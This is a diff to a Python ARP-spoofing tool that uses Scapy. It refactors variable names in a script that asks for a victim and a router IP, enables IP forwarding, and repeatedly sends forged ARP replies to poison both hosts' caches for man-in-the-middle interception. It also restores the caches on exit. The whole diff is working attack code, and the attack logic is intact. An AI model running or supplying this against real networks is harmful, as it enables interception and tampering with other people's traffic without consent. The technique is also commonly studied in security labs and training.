@@ -54,19 +54,17 @@ def get_mac(IP):
     return rcv.sprintf(r"%Ether.src%")
 
 
-def reARP():
+def reARP(gate_mac, victim_mac):
   print("[*] Restoring Targets...")
-  victimMAC = get_mac(victimIP)
-  gateMAC = get_mac(gateIP)
-  send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
-  send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
+  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
+  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
 
 
 def trick(gate_mac, victim_mac):
   print(gate_mac)
   print(victim_mac)
-  send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=victim_mac))
-  send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gate_mac))
+  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst=victim_mac))
+  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst=gate_mac))
 
 
 def sniffer():
@@ -79,8 +77,8 @@ def sniffer():
 
 def mitm():
   try:
-    victimMAC = get_mac(victimIP)
-    print(victimMAC)
+    victim_mac = get_mac(victim_ip)
+    print(victim_mac)
   except Exception as e:
     print(e)
     print("[!] Couldn't Find Victim MAC Address")
@@ -88,7 +86,8 @@ def mitm():
     sys.exit(1)
 
   try:
-    gateMAC = get_mac(gateIP)
+    gate_mac = get_mac(gate_ip)
+    print(gate_mac)
   except Exception as e:
     print(e)
     print("[!] Couldn't Find Gateway MAC Address")
@@ -98,11 +97,11 @@ def mitm():
   print("[*] Poisoning Targets...")
   while 1:
     try:
-      trick(gateMAC, victimMAC)
+      trick(gate_mac, victim_mac)
       time.sleep(1.5)
       # sniffer()
     except KeyboardInterrupt:
-      reARP()
+      reARP(gate_mac, victim_mac)
       print("[*] User Requested Shutdown")
       print("[*] Exiting...")
       return
@@ -111,8 +110,8 @@ def mitm():
 if __name__ == '__main__':
   try:
     interface = input("[*] Enter Desired Interface: ")
-    victimIP = input("[*] Enter Victim IP: ")
-    gateIP = input("[*] Enter Router IP: ")
+    victim_ip = input("[*] Enter Victim IP: ")
+    gate_ip = input("[*] Enter Router IP: ")
     enable_ip_forwarding()
     mitm()
   except KeyboardInterrupt:
